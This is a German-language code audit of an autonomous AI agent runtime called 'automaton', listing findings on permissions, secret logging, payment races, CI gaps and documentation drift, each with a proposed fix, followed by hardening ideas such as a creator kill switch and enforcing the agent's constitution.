- **Problem:** createDatabase führt `PRAGMA integrity_check` (O(DB-Größe)) bei jedem Öffnen aus, also auch bei --status, CLI status/logs, --pick-model, --configure. turns, tool_calls, wake_events, policy_decisions, inbox_messages, modifications haben keine DELETE-/Retention-Logik (nur heartbeat_history und inference_costs werden gepruned), checkpointWAL wird nur in Tests aufgerufen. Bei Integritätsfehler wirft createDatabase -> Exit 1 ohne Auto-Restore. Älterer Build öffnet neuere Schemas ohne Downgrade-Schutz.
- **Fix:** `quick_check` beim Start, vollständigen Check per Heartbeat/Wartung; Retention + `PRAGMA incremental_vacuum`/periodisches wal_checkpoint; Schema-Versions-Downgrade-Guard; Auto-Restore aus letztem Backup.

### core-045: State-Verzeichnis und DB-Dateien entstehen mit Standard-umask (0755/0644); Runtime-Klon liegt im State-Repo

**Art:** Sicherheit · **Fundstelle:** `scripts/automaton.sh:50`

- **Problem:** `mkdir -p "$(dirname "$INSTALL_DIR")"` legt ~/.automaton mit umask an; getWallet/createDatabase setzen mode 0700 nur, wenn das Verzeichnis noch nicht existiert (wallet.ts:76-79, database.ts:81-83), die SQLite-Datei entsteht mit 0644. Auf Mehrbenutzersystemen sind Verlauf, Inbox, KV lesbar. Außerdem wird bei Nicht-root die Runtime nach ~/.automaton/runtime geklont, also in das vom Agenten per git verwaltete State-Repo (eingebettetes Repo/Gitlink, ständige 'modified'-Meldungen).
- **Fix:** umask 077 im Installer, chmod 0700/0600 beim Start erzwingen (auch für vorhandene Verzeichnisse), Runtime außerhalb von ~/.automaton installieren.

### core-046: Paket-/Build-Hygiene: Haupteintrag ist die CLI, veraltetes package-lock.json, npm- vs pnpm-Anleitung, ungenutzte Abhängigkeiten

**Art:** Code · **Fundstelle:** `package.json:6`

- **Problem:** main/exports zeigen auf dist/index.js, das beim Import main() ausführt und keine Exporte hat (types=dist/index.d.ts leer). package-lock.json (Name 'automaton', 0.1.0, nur typescript) ist verwaist und widerspricht pnpm-lock.yaml. README:30 nutzt `npm install && npm run build`; npm ignoriert pnpm-lock und pnpm.onlyBuiltDependencies, `build` ruft `pnpm -r build` (Zeile 41) und scheitert ohne pnpm; spawn.ts:132 macht dasselbe für Kinder. Abhängigkeiten `ora` und `simple-git` werden nirgends importiert, `@types/better-sqlite3` liegt in dependencies (Zeile 52), `clean` nutzt `rm -rf` (Zeile 49), kein `files`-Feld (Tests, Skripte werden mitveröffentlicht).
- **Fix:** package-lock.json löschen, README auf pnpm/corepack (oder npm-Workspaces) vereinheitlichen, Build-Skript ohne Pflicht-pnpm, ungenutzte Deps entfernen, `files` setzen, cross-platform clean (rimraf), separaten CLI-Einstieg/Library-Export trennen.

### core-047: Versionsnummern sind an sechs Stellen hartcodiert und driften (Banner 0.2.0, CLI 0.2.0, Doku 0.1.0); gespeicherte config.version veraltet

**Art:** Code · **Fundstelle:** `src/setup/banner.ts:20`

- **Problem:** index.ts:41 (0.2.1), types.ts:87, config.ts:154, package.json:3 (0.2.1) vs banner.ts:20 (v0.2.0), packages/cli/package.json:3 (0.2.0), DOCUMENTATION.md:222/299 (0.1.0). loadConfig übernimmt `version` aus der gespeicherten Datei; --status und heartbeat_ping (tasks.ts:63) melden die Config-Version statt der laufenden.
- **Fix:** Version einmalig aus package.json (`createRequire`/Build-Konstante) beziehen, Release-Workflow prüft Tag == package.json.

### core-048: Dokumentation weicht an vielen Stellen vom Code ab

**Art:** Funktion · **Fundstelle:** `DOCUMENTATION.md:100`

- **Problem:** Auswahl: Dateiliste nennt `api-key` (real: config.json; inference-providers.json fehlt, DOCUMENTATION:100,984); `--configure`/`--pick-model` und OLLAMA_BASE_URL fehlen im CLI-Abschnitt (Zeilen 185-200); 'heartbeat.yml cannot be written by the agent' (Zeile 977) stimmt nicht (nicht in PROTECTED_FILES, modify_heartbeat existiert); Idle-Erkennung 'after 3 idle turns' (Zeile 1080) vs MAX_IDLE_TURNS = 10; '897 tests'/'24 Dateien' (ARCHITECTURE:743) vs ca. 1500 Testfälle in deutlich mehr Dateien; Migrationen 'v1-v8' vs bis V11; README-Struktur kennt inference/, memory/, soul/, orchestration/ nicht; README-Gesetz III lässt den Satz zur Wahrung menschlicher Aufsicht aus constitution.md weg; README erklärt das Verhalten von dead anders als die Doku.
- **Fix:** Doku-Fakten aus Code generieren (Defaults, Tool-Liste, Testanzahl), Doku-Review in CI, Konstitutionstext nur aus constitution.md einbinden.

### core-049: CLI-Kleinigkeiten: negatives --tail liefert gesamte Historie, Terminal-Escape-Injection, falsche State-Farben, Exit 0 bei Unbekanntem, kein Timeout

**Art:** Code · **Fundstelle:** `packages/cli/src/commands/logs.ts:16`

- **Problem:** `--tail -5` -> getRecentTurns(-5) = SQLite LIMIT -5 = unbegrenzt (Zeile 16-18). logs.ts:56/59 und status.ts:58 geben turn.input/thinking (enthält Fremdnachrichten und LLM-Text) unmaskiert aus; ANSI/OSC-Sequenzen erreichen das Terminal des Creators. stateColor kennt 'normal', den es als AgentState nicht gibt (status.ts:30), 'sleeping'/'running' werden nie eingefärbt. index.ts:26 beendet unbekannte Kommandos mit Exit 0, keine --help/--version. runtime-shims.d.ts und node-shims.d.ts überschreiben die echten Typen (`declare const process` kollidiert mit @types/node; nur durch skipLibCheck verdeckt) und können vom Runtime-API abweichen. fund.ts:54 hat keinen fetch-Timeout.
- **Fix:** limit clampen (1..1000), Steuerzeichen filtern, echte Typen aus dem Workspace-Paket verwenden, Exit-Code 2 bei Usage-Fehler.

### core-050: Toter und doppelter Code: MAX_CHILDREN, SURVIVAL_THRESHOLDS.dead, MESSAGE_LIMITS-Duplikat, conways-rules.txt, kopierte Menü-Logik

**Art:** Code · **Fundstelle:** `src/types.ts:860`

- **Problem:** `MAX_CHILDREN` wird nirgends verwendet, `SURVIVAL_THRESHOLDS.dead` ebenfalls nicht (getSurvivalTier prüft `>= 0`), MESSAGE_LIMITS existiert zweimal (types.ts:1346 und social/signing.ts:17), scripts/conways-rules.txt wird von keinem Code gelesen (system-prompt.ts hat eigene CORE_RULES), PROVIDER_LABEL/printModelTable sind in model-picker.ts und configure.ts doppelt, tsconfig ohne noUnusedLocals lässt z.B. den ungenutzten Import setGlobalLogLevel durch.
- **Fix:** Duplikate entfernen/zusammenführen, `noUnusedLocals`/ESLint aktivieren.

### core-051: Lost-Update zwischen --configure/--pick-model und laufendem Agenten (Gesamtdatei-Schreibzugriffe ohne Sperre)

**Art:** Logik · **Fundstelle:** `src/setup/configure.ts:314`

- **Problem:** runConfigure lädt die Config einmal und schreibt bei jedem Menüpunkt das komplette Objekt; model-picker.ts:80 ebenso. Der laufende Agent schreibt seine In-Memory-Config bei switch_model/update_genesis_prompt (tools.ts:926,2113) zurück und läuft mit dem alten Zustand weiter, die Doku sagt 'Restart to apply'.
- **Fix:** Config-Änderungen als Patch auf die aktuelle Datei anwenden (read-modify-write unter Dateisperre) und Laufzeit-Reload (SIGHUP) anbieten.

### core-052: Chain-Auswahl im Wizard wird bei vorhandenem Wallet ignoriert, aber vorher als gewählt ausgegeben

**Art:** Funktion · **Fundstelle:** `src/setup/wizard.ts:39`

- **Problem:** Der Wizard druckt 'Chain: Solana' (Zeile 32-34), getWallet(selectedChain) lädt jedoch ein vorhandenes EVM-Wallet unverändert; erst das 'Wallet loaded' zeigt die tatsächliche Adresse. createConfig verwendet walletChainType (richtig), die UI ist irreführend. SOUL.md (defaults.ts:30) nennt immer 'x402 payments (USDC on Base)'.
- **Fix:** Bei vorhandenem Wallet die Chain-Frage überspringen und die tatsächliche Chain anzeigen.

### core-060: LocalWorkerPool/Orchestrator werden pro runAgentLoop neu erzeugt: laufende Worker gelten nach dem Schlafen als tot und ihre Tasks werden doppelt vergeben

**Art:** Logik · **Fundstelle:** `src/agent/loop.ts:188`

- **Problem:** workerPool, orchestrator und Provider-Registry sind lokale Variablen von runAgentLoop (loop.ts:128-203); shutdown() des Pools wird nie aufgerufen. Der Loop darf bei aktiven Delegationen 60 s schlafen (loop.ts:548-565); index.ts startet danach runAgentLoop neu. Der alte Pool läuft mit seinen Promises weiter, der neue kennt sie nicht: isWorkerAlive('local://...') ist false (loop.ts:210-213), und Orchestrator.tick setzt 'assigned'-Tasks auf 'pending' (orchestrator.ts:531-546).
- **Fix:** Pool, Orchestrator und Registry einmal in index.ts erzeugen und über Zyklen wiederverwenden; bei Shutdown abbrechen. Alternativ die Worker-Liveness in der DB führen (worker_id, last_seen), nicht im Prozess-Speicher.

### core-062: Heartbeat-Seeding setzt bei jedem Start den Scheduler-Zustand zurück; das Feld `task` benutzerdefinierter Einträge wird verworfen

**Art:** Funktion · **Fundstelle:** `src/heartbeat/daemon.ts:80`

- **Problem:** upsertHeartbeatSchedule nutzt INSERT OR REPLACE mit lastRunAt/nextRunAt=null, runCount/failCount=0, priority 0, timeout 30 s, tierMinimum 'dead' (daemon.ts:80-98). Jeder Neustart macht alle Tasks sofort fällig (kein Cron-Gedächtnis). Zudem hat HeartbeatScheduleRow keine `task`-Spalte: executeTask schlägt nur taskFn = tasks.get(entry.name) nach (scheduler.ts:175) und kehrt bei Unbekanntem still zurück.
- **Fix:** Bestehende Schedule-Zeilen beim Seeding nur ergänzen (INSERT ... ON CONFLICT DO UPDATE nur für cron/enabled), lastRun/nextRun erhalten. `task` in der Tabelle speichern und beim Ausführen auflösen. Unbekannte Tasks beim Start loggen und ablehnen.

### core-064: lowComputeMultiplier und tierMinimum sind wirkungslos: der Heartbeat verlangsamt sich im Low-Compute-Modus nie

**Art:** Funktion · **Fundstelle:** `src/heartbeat/tick-context.ts:69`

- **Problem:** tick-context.ts:69-77 liest lowComputeMultiplier, aber weder scheduler.ts noch tasks.ts verwenden ctx.lowComputeMultiplier. Alle Tasks werden mit tierMinimum 'dead' angelegt (daemon.ts:89), sodass tierMeetsMinimum immer wahr ist. README/Doku ('Slows heartbeat', '4x slower', 'Sheds non-essential tasks') und der Konfig-Schlüssel in heartbeat.yml haben keine Wirkung.
- **Fix:** Intervalle nicht-essentieller Tasks im Scheduler mit lowComputeMultiplier skalieren (nextRun = interval * multiplier) und tierMinimum pro Task (z. B. soul_reflection/refresh_models >= normal) setzen. Test für getDueTasks pro Tier.

### core-070: API-unerreichbar-Sentinel (-1) wird nach der Erkennung als Tier 'dead' an den Router gegeben: leere Turns statt Low-Compute-Betrieb

**Art:** Logik · **Fundstelle:** `src/agent/loop.ts:599`

- **Problem:** loop.ts:434-437 erkennt creditsCents===-1 und will 'in low-compute mode' weiterlaufen. Zeile 599 ruft jedoch getSurvivalTier(-1) auf, das 'dead' liefert (credits.ts:38-44). Die DEFAULT_ROUTING_MATRIX hat für 'dead' keine Kandidaten, die Fallback-Modelle scheitern an tierMinimum, selectModel gibt null zurück und route() liefert content:'' mit finishReason:'error' ohne Exception. consecutiveErrors wird daher zurückgesetzt.
- **Fix:** Bei Sentinel -1 expliziten Tier (low_compute) an den Router geben oder die Turn-Ausführung überspringen und kurz schlafen. finishReason 'error' aus dem Router als Fehler zählen und keine leeren Turns persistieren.

### core-071: Timeout beim Bootstrap-Topup bricht die Zahlung nicht ab; Folge-Topups können doppelt kaufen

**Art:** Ausführung · **Fundstelle:** `src/index.ts:341`

- **Problem:** Promise.race (index.ts:341-369) verwirft nur das Warten nach 15 s; die async IIFE mit dem x402-Flow läuft weiter und kann nachträglich on-chain abrechnen. Das Log sagt 'Bootstrap topup skipped'. Nicht synchronisierte Folgepfade (Inline-Topup im Loop mit 60 s Cooldown, Heartbeat check_usdc_balance mit 5 min Cooldown) sehen noch alte Credits und können weitere $5 kaufen.
- **Fix:** AbortSignal bis in x402Fetch durchreichen oder das Ergebnis des laufenden Kaufs abwarten und nicht als 'skipped' behandeln. Einen persistenten 'topup_in_flight'-Lock (KV mit Zeitstempel) für alle drei Pfade nutzen und vor jedem Kauf Credits neu laden.

### core-072: Installer bricht mit `git pull --ff-only` ab, sobald der Agent den Code im selben Checkout verändert hat

**Art:** Ausführung · **Fundstelle:** `scripts/automaton.sh:47`

- **Problem:** Der Installer ist zugleich der Starter (`exec node dist/index.js --run`). edit_own_file ändert und committet im Arbeitsverzeichnis (process.cwd() == INSTALL_DIR, code.ts:179-196). Divergierter Verlauf oder überlappende lokale Änderungen lassen `git pull --ff-only` unter `set -e` scheitern, der Agent wird nicht gestartet. Die Doku empfiehlt ausdrücklich, den Installer zum Aktualisieren/Neustart zu nutzen.
- **Fix:** Update-Strategie festlegen: Betreiber-Code (read-only, gepinnter Tag) getrennt vom Agenten-Arbeitsbereich halten. Beim Update `git stash`/Rebase mit klarer Meldung durchführen oder bei Fehlschlag den vorhandenen Build trotzdem starten. Fehlerausgabe und Exit-Code verständlich machen.

### core-074: count_errors liefert bei null Fehlern "0\n0" und bricht die Zusammenfassung unter `set -e` ab

**Art:** Code · **Fundstelle:** `scripts/soak-test.sh:53`

- **Problem:** `grep -c ... || echo "0"` (soak-test.sh:51-57): grep -c druckt bei null Treffern '0' und beendet sich mit Status 1, danach druckt `echo "0"` ein zweites '0'. $(count_errors) ergibt "0\n0". In summarize() ergibt `$((final_errors * 100 / CHECK_COUNT))` (Zeile 108) einen Syntaxfehler in der arithmetischen Expansion; das Skript bricht ab, ohne PASS/FAIL auszugeben. Gerade der Erfolgsfall (keine Fehler) scheitert. Zusätzlich vergleicht die Fehlerquote Zeilenzahl mit Anzahl der 5-Minuten-Checks.
- **Fix:** `c=$(grep -c ... "$LOG_FILE" 2>/dev/null || true); echo "${c:-0}"` verwenden; Fehlerquote auf Fehler pro Stunde oder pro Turn beziehen.

### core-075: `--provision` schreibt den vollständigen API-Key als JSON-Log nach stdout

**Art:** Sicherheit · **Fundstelle:** `src/index.ts:101`

- **Problem:** provision() liefert {apiKey, walletAddress, keyPrefix}; index.ts:100-101 loggt `JSON.stringify(result)` unredigiert über den StructuredLogger (der keine Redaction kennt). Der Wizard zeigt dagegen nur den Prefix. Der Key landet in Terminal-Scrollback, CI-/systemd-/Docker-Logs.
- **Fix:** Nur keyPrefix und walletAddress ausgeben (Key steht ohnehin in config.json mit 0600). Logger um Redaction für Felder wie apiKey/privateKey/secret ergänzen.

### core-076: Dokumentierte Umgebungsvariablen CONWAY_API_KEY/CONWAY_API_URL überschreiben die Konfiguration nicht

**Art:** Funktion · **Fundstelle:** `src/index.ts:70`

- **Problem:** --help (index.ts:69-72), DOCUMENTATION.md:199-200 und die Troubleshooting-Anleitung ('set CONWAY_API_KEY environment variable') behaupten einen Override. CONWAY_API_KEY wird im Code nie gelesen (loop.ts schreibt sie nur), CONWAY_API_URL nur von provision(); run() nutzt config.conwayApiUrl/conwayApiKey. Außerdem gibt es keine Möglichkeit, das State-Verzeichnis zu verlagern (HOME hartcodiert), obwohl die FAQ 'custom path' nennt.
- **Fix:** Env-Override in loadConfig/run() implementieren (CONWAY_API_KEY, CONWAY_API_URL, AUTOMATON_HOME/--config-dir) und dokumentieren, oder die Doku und --help korrigieren.

### core-077: Lesende Kommandos (--status, automaton-cli status/logs) öffnen die DB mit Migration, Integritäts-Scan und Schreibzugriff

**Art:** Ausführung · **Fundstelle:** `src/index.ts:153`

- **Problem:** showStatus (index.ts:152-153) und CLI status.ts:21/logs.ts:27 rufen createDatabase auf: das legt bei falschem Pfad eine leere state.db an, setzt WAL, führt vollständigen integrity_check und CREATE_TABLES/Migrationen in einer Schreibtransaktion aus (database.ts:85-116) und kann dabei mit dem laufenden Agenten um das Schreiblock konkurrieren (Standard-Timeout 5 s). Eine ältere CLI kann ein neueres Schema anfassen.
- **Fix:** Separate openReadOnly(path) (`new Database(path,{readonly:true,fileMustExist:true})`) ohne Migration/Integritätscheck für Status/Logs; fehlende DB als Fehler melden und Schema-Version prüfen.

### core-078: Fehlendes .gitattributes: Windows-Checkouts (core.autocrlf=true) liefern Shell-Skripte mit CRLF

**Art:** Ausführung · **Fundstelle:** `scripts/automaton.sh:1`

- **Problem:** Im Repo existiert keine .gitattributes; `git ls-files --eol` zeigt für scripts/*.sh, constitution.md und die Workflows i/lf, w/crlf. Mit CRLF scheitern die Skripte unter bash/sh ('/bin/sh^M: bad interpreter', `set -e^M`), und Hash-/Diff-Vergleiche der constitution.md zwischen Plattformen weichen ab.
- **Fix:** `.gitattributes` mit `*.sh text eol=lf`, `constitution.md text eol=lf`, `*.yml text eol=lf`; dazu optional ein CI-Job unter windows-latest.

### core-079: CI-Lücken: kein Build, CLI-Paket und Testcode werden nie typgeprüft, Coverage-Schwellen ungenutzt, Release veröffentlicht nichts

**Art:** Code · **Fundstelle:** `.github/workflows/ci.yml:16`

- **Problem:** CI führt nur `tsc --noEmit` aus (tsconfig.json schließt src/__tests__ aus, packages/cli ist nicht enthalten) und baut nie: CLI-Fehler zeigen sich erst im Release-Tag. vitest.config.ts definiert Coverage-Schwellen (60/50/55/60), CI ruft aber nie `test:coverage` auf. release.yml (Tag v*) typecheckt/testet/baut nur und erzeugt weder GitHub-Release noch npm-Publish noch Artefakt; keine permissions-Beschränkung, Actions nur per Tag gepinnt. Es gibt keine Tests für setup/, config.ts, index.ts, CLI und scripts.
- **Fix:** In CI `pnpm build` (inkl. CLI) und `tsc -p tsconfig.test.json` ergänzen, `test:coverage` mit Schwellen erzwingen, Release-Job mit Artefakt/Publish und `permissions: contents: write` versehen, Actions per SHA pinnen, Windows-Runner und shellcheck für scripts/ hinzufügen.

### core-080: Wizard erlaubt Setup ohne API-Key ('limited functionality'), aber run() beendet danach sofort mit Exit 1

**Art:** Funktion · **Fundstelle:** `src/setup/wizard.ts:78`

- **Problem:** wizard.ts:78-80 meldet bei fehlendem Key 'limited functionality' und das Funding-Panel 'The automaton will start now'. Direkt danach bricht run() mit 'No API key found' und process.exit(1) ab (index.ts:199-203), weil ohne Key weder Inferenz noch Sandbox noch Registrierung möglich sind. Der Nutzer erhält nur einen Hinweis auf --provision.
- **Fix:** Im Wizard Provisionierung wiederholen/abbrechen oder run() bei fehlendem Key automatisch provisionieren (mit Retry/Backoff). Wizard-Text an das tatsächliche Verhalten anpassen.

### core-082: Kein Prozess-Supervisor/Autostart: der Installer startet den Agenten im Vordergrund per exec

**Art:** Ausführung · **Fundstelle:** `scripts/automaton.sh:62`

- **Problem:** Repo enthält weder systemd-Unit noch Dockerfile/Compose noch Restart-Policy; automaton.sh endet mit `exec node dist/index.js --run`. Bei SSH-Abbruch, Reboot, OOM oder Crash (main().catch -> exit 1; keine globalen Fehler-Handler) ist der Agent weg und nach README 'continuously running' nicht mehr erreichbar. Kein Health-/Liveness-Signal: agent_state bleibt nach einem Absturz 'running'.
- **Fix:** systemd-Unit/Dockerfile mit Restart=on-failure und Healthcheck (PID/Heartbeat-Zeitstempel in DB) mitliefern; Installer kann optional `--install-service` anbieten. Status soll Prozess-Liveness aus last_heartbeat anzeigen.

### core-083: Das gesamte Modul src/survival/* (monitor, low-compute, funding) wird produktiv nirgends verwendet

**Art:** Code · **Fundstelle:** `src/survival/funding.ts:28`

- **Problem:** executeFundingStrategies, applyTierRestrictions, canRunInference, getModelForTier, checkResources und recordTransition haben nur Test-Importer (grep). Tier-Logik liegt verstreut in loop.ts, heartbeat/tasks.ts, inference/router.ts und conway/credits.ts. README 'survival/ Credit monitor, low-compute mode, survival tiers' beschreibt toten Code; Tests grün erzeugen falsche Sicherheit (z. B. canRunInference('dead')===false wird nie angewendet).
- **Fix:** Tier-Logik in einem Modul bündeln (eine Quelle für Schwellwerte, Modellwahl, Funding-Aktionen) und aus Loop/Heartbeat/Router aufrufen, oder das Modul samt Tests entfernen.

## Verbesserungsideen

- **Nicht-interaktiver, reproduzierbarer Setup und Supervision:** Setup per Env/Flags/Seed-Datei (`--setup --yes --from-genesis`), TTY-Prüfung, Exit-Codes, Dockerfile/Compose und systemd-Unit mitliefern; Instanz-Lock mit PID und Stale-Erkennung; `--status --json` und Health-Endpoint für Monitoring.
- **Sauberer Secret- und Identitätsschutz:** Secrets in eine eigene Datei/OS-Keychain/KMS, nicht in automaton.json und nicht im Git-Repo; wallet.json optional verschlüsselt; Signer-Prozess bzw. getrennter OS-User, sodass die LLM-gesteuerte exec-Umgebung den Private Key nie sieht; atomare Schreibvorgänge (tmp+fsync+rename) und verpflichtende Wallet-Backup-Anleitung.
- **Zentrale Ausgaben-Gateway-Funktion:** Jede Geldbewegung (Topup, x402, transfer_credits, fund_child, Domains, Sandboxes) läuft durch PolicyEngine + SpendTracker mit echter Reserve, Cooldown, Tages-/Stunden-Limits und einem echten Bestätigungskanal (Creator-signierte Freigabe über CLI/Relay) statt 'quarantine = deny'.
- **Echter Einnahmenpfad und Gewinnsteuerung:** x402-Paywall-/Server-Vorlage, Zahlungseingangs-Watcher mit Buchung als Einnahme, Gewinn-und-Verlust-Report, Burn-Rate und Break-even-Planung; Ausgabenbudget und Modellwahl adaptiv an gleitenden Nettoertrag koppeln; 'dead'/'critical' als reale Zustände (Inferenz stoppen, nur Heartbeat, Wiederbelebung bei Funding) mit Wake-Dedup.
- **Konstitution technisch erzwingen:** Text und Hash in den Build einbetten und bei Start und je Turn prüfen; Kinder verifizieren constitution.sha256 beim Start; Law-I/II als ausführbare Policy-Regeln (z.B. Outbound-Rate, Inhaltsprüfung, Domain-/Ziel-Allowlist, Genehmigung für Erstkontakte); Verstöße protokollieren und den Creator benachrichtigen; Creator-Kill-Switch (pause/resume/stop-Signatur) umsetzen, damit 'legitimate human oversight' real ist.
- **Creator-Authentifizierung und CLI:** Creator-CLI signiert mit eigenem Schlüssel/Hardware-Wallet; die Runtime akzeptiert Creator-Autorität nur bei Signatur von creatorAddress; Befehle `approve`, `pause`, `resume`, `rotate-key`, `backup`, `restore`; Betragseingaben explizit mit Einheit und Bestätigung.
- **Backup/Restore als Runtime-Befehl:** `automaton --backup/--restore` mit better-sqlite3 `db.backup()`, Einbezug von Wallet, Config, SOUL, Skills, verschlüsselte Archive, periodischer Heartbeat-Task, Restore-Prüfung inklusive Adress-Konsistenz und Laufzeit-Sperre, optional Off-Site-Ziel.
- **Installer härten:** Releases per signiertem Tag/Checksumme, Version fest pinnen, kein root, `</dev/tty` bzw. `--yes`, Funktionskapselung des Skripts, Update nur auf Wunsch, Container-First-Deployment mit read-only Dateisystem und Netz-Egress-Allowlist; Kinder mit exakt der Parent-Version und Hash installieren.
- **Konfiguration mit Schema und Single Source of Truth:** zod-Schema mit Validierung, Migrationen und `automaton --config check`; Versionen, Schwellwerte, Tool-Anzahl und Defaults aus Code in README/Doku/Skills generieren; ein zentrales paths.ts (os.homedir, AUTOMATON_HOME); Env-Overrides (CONWAY_API_KEY/URL, LOG_LEVEL) tatsächlich implementieren.
- **Graceful Shutdown und Robustheit:** AbortController durch Loop/Inference/Tools, Turn-Abschluss mit Deadline, asynchrones exec, globale Fehler-Handler, Zwischenzustand 'draining'; Orphan-Erkennung für halbfertige Turns (Tool-Ausführung vor Persistierung journalisieren).
- **CI und Qualitätssicherung ausbauen:** Matrix inklusive Windows/macOS (oder Windows explizit ausschließen), Build und Typecheck des CLI, Typecheck der Tests, Lint/ShellCheck für Skripte, Coverage-Gate, Hänger nicht maskieren, Audit mit Schwellwert und Dependabot, SHA-gepinnte Actions, `permissions` minimal, Release mit Artefakt/Provenance und Tag-Versions-Check; Tests für config.ts, Wizard, CLI-Parser, Installer (bats) und einen E2E-Smoke-Test gegen eine Mock-Conway-API (Erststart, Restart, Crash-Recovery, Kind-Bootstrap).
- **Datenhygiene und Beobachtbarkeit:** Retention für turns/tool_calls/wake_events/policy_decisions, periodisches Checkpoint/Optimize, quick_check beim Start; Log-Level wirksam machen, Log-Rotation, Metriken/Alerts (Tier-Wechsel, Distress, Topup) per Webhook/E-Mail an den Creator.
- **Plattformunterstützung klar definieren:** Offiziell Linux/macOS/WSL oder echte Windows-Unterstützung (Shell-Abstraktion, Pfade, Signale); README mit Voraussetzungen, Verzeichnis-Layout (~/.automaton) und Betriebsmodi (Sandbox vs. lokal inkl. Warnung) ergänzen.

